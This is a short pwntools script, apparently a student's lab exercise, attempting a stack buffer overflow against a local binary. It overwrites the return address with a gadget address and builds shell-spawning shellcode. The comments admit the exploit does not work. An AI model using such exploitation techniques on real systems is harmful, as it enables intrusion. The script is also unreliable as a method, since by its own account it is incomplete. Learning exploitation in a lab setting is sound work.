from pwn import *

#Found the number of integers I have to input to reach the return address
OFFSET = 14

#create a remote process
p = process("lab2-3.bin")

#shellcode
context.arch = "amd64"
SC = asm(shellcraft.amd64.linux.sh())

#Fill the array with zeros
for i in range(OFFSET):
    p.sendline(b"0")

#I was able to find the address of a "mov rax, someData"; "jmp rax" however I could not figure out how to get the shell code into the register
p.sendline(b"4198408")

#Here I noticed that I could fill the registry of rbp but I could not find any useful assembly code to exploit it
p.sendline(b"0")

p.sendline(b"-1")
p.interactive()

